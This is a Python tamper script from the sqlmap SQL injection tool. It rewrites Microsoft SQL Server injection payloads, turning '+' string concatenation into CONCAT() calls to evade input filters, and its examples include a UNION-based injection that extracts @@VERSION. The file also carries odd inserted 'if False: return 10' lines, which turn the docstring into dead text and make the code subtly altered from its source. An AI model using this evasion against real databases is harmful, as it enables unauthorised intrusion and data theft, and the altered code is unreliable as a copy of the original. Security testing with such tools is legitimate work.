"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import os
import re
from lib.core.common import singleTimeWarnMessage
from lib.core.common import zeroDepthSearch
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.HIGHEST

def dependencies():
    if False:
        return 10
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split('.')[0], DBMS.MSSQL))

def tamper(payload, **kwargs):
    if False:
        return 10
    "\n    Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart\n\n    Tested against:\n        * Microsoft SQL Server 2012\n\n    Requirements:\n        * Microsoft SQL Server 2012+\n\n    Notes:\n        * Useful in case ('+') character is filtered\n\n    >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')\n    'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL'\n\n    >>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')\n    '1 UNION ALL SELECT NULL,NULL,CONCAT(CHAR(113),CHAR(118),CHAR(112),CHAR(112),CHAR(113),ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),CHAR(113),CHAR(112),CHAR(107),CHAR(112),CHAR(113))-- qtfe'\n    "
    retVal = payload
    if payload:
        match = re.search("('[^']+'|CHAR\\(\\d+\\))\\+.*(?<=\\+)('[^']+'|CHAR\\(\\d+\\))", retVal)
        if match:
            part = match.group(0)
            chars = [char for char in part]
            for index in zeroDepthSearch(part, '+'):
                chars[index] = ','
            replacement = 'CONCAT(%s)' % ''.join(chars)
            retVal = retVal.replace(part, replacement)
    return retVal